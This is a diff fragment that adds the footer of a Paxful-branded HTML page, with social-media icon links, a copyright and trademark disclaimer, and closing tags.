+          <path d="M8 0C3.581 0 0 3.603 0 8.049 0 12.067 2.925 15.396 6.75 16v-5.625H4.719V8.05H6.75V6.276c0-2.017 1.194-3.132 3.022-3.132.875 0 1.79.157 1.79.157v1.981h-1.009c-.994 0-1.303.62-1.303 1.258v1.509h2.219l-.355 2.326H9.25V16c3.825-.604 6.75-3.933 6.75-7.951C16 3.603 12.419 0 8 0z"></path></svg></a></li><li class="mr-3"><a id="footerLinkTwitter" class="btn btn-square d-flex justify-content-center align-items-center" href="https://twitter.com/paxful" target="_blank" rel="noreferrer"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path fill-rule="evenodd" d="M15.969 3.508a6.77 6.77 0 01-1.884.503 3.228 3.228 0 001.442-1.768 6.886 6.886 0 01-2.083.77A3.308 3.308 0 0011.049 2C9.24 2 7.77 3.431 7.77 5.193c0 .253.03.496.085.73a9.386 9.386 0 01-6.762-3.33A3.075 3.075 0 00.65 4.202c0 1.11.58 2.086 1.459 2.66a3.343 3.343 0 01-1.486-.4v.04c0 1.547 1.129 2.84 2.631 3.134a3.418 3.418 0 01-1.474.054c.42 1.27 1.629 2.194 3.068 2.22A6.686 6.686 0 01.78 13.276c-.26 0-.52-.015-.78-.044a9.508 9.508 0 005.037 1.435c6.036 0 9.334-4.868 9.334-9.083 0-.136 0-.272-.01-.409A6.533 6.533 0 0016 3.521z" clip-rule="evenodd"></path></svg></a></li><li class="mr-3"><a id="footerLinkYouTube" class="btn btn-square d-flex justify-content-center align-items-center" href="https://www.youtube.com/PaxfulOfficial" target="_blank" rel="noreferrer"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path fill-rule="evenodd" d="M15.663 4.137a2.005 2.005 0 00-1.392-1.392c-1.246-.334-6.264-.334-6.264-.334s-5.004-.007-6.264.334A2.005 2.005 0 00.351 4.137a20.844 20.844 0 00-.348 3.87 20.844 20.844 0 00.348 3.855 2.005 2.005 0 001.392 1.392c1.246.335 6.264.335 6.264.335s5.004 0 6.264-.335a2.004 2.004 0 001.392-1.392c.23-1.272.342-2.563.334-3.855a20.837 20.837 0 00-.334-3.87zM6.406 10.4V5.605l4.176 2.402z" clip-rule="evenodd"></path></svg></a></li><li><a id="footerLinkReddit" class="btn btn-square d-flex justify-content-center align-items-center" href="https://www.reddit.com/r/paxful/" target="_blank" rel="noreferrer"><svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path fill-rule="evenodd" d="M7.984 13.02c-1.196 0-2.038-.26-2.575-.798a.3.3 0 010-.422.313.313 0 01.423 0c.42.42 1.124.629 2.152.629s1.728-.2 2.146-.62a.31.31 0 01.42 0c.11.12.11.31 0 .43-.54.54-1.377.8-2.575.8zM5.58 7.97a1.13 1.13 0 00-1.118 1.118c0 .607.51 1.1 1.118 1.1a1.1 1.1 0 001.101-1.1c0-.608-.493-1.118-1.1-1.118zm4.822 0c-.61 0-1.118.51-1.118 1.118 0 .607.509 1.1 1.118 1.1a1.1 1.1 0 001.1-1.1c0-.608-.492-1.118-1.1-1.118zM.812 9.96c0-.184.016-.363.046-.54A1.815 1.815 0 010 7.878c0-.998.818-1.809 1.817-1.809a1.8 1.8 0 011.198.455c1.237-.794 2.904-1.294 4.74-1.328l1.209-3.683.269.064.01.001 2.816.662a1.491 1.491 0 012.864.583 1.49 1.49 0 01-1.488 1.489 1.49 1.49 0 01-1.486-1.487l-2.567-.608-.978 2.985c1.766.07 3.364.57 4.562 1.347.33-.31.763-.48 1.222-.48A1.81 1.81 0 0116 7.878c0 .658-.36 1.257-.919 1.577.02.17.04.329.04.499-.01 2.625-3.204 4.762-7.147 4.762l-.022.006c-3.937 0-7.14-2.137-7.14-4.761z" clip-rule="evenodd"></path></svg></a></li></ul></nav></div>
+      
+      
+    </div>
+ 
+</div>
+<div class="container">
+    <div class="copyrigh">
+      <small>“PAXFUL” is a registered trademark of Paxful, Inc. Copyright © 2022 Paxful, Inc. All Rights Reserved. Paxful Inc. has no relation to MoneyGram, Western Union, Payoneer, WorldRemit, Paxum, PayPal, Amazon, OkPay, Payza, Walmart, Reloadit, Perfect Money, WebMoney, Google Wallet, BlueBird, Serve, Square Cash, NetSpend, Chase QuickPay, Skrill, Vanilla, MyVanilla, OneVanilla, Neteller, Venmo, Apple, ChimpChange or any other payment method. We make no claims about being supported by or supporting these services. Their respective wordmarks and trademarks belong to them alone. Official mailing address: 3422 Old Capitol Trail, PMB 989, Wilmington DE 19808</small>
+      </div>
+</div>
+</section>
+
+</main>
+
+  </body>
+</html>
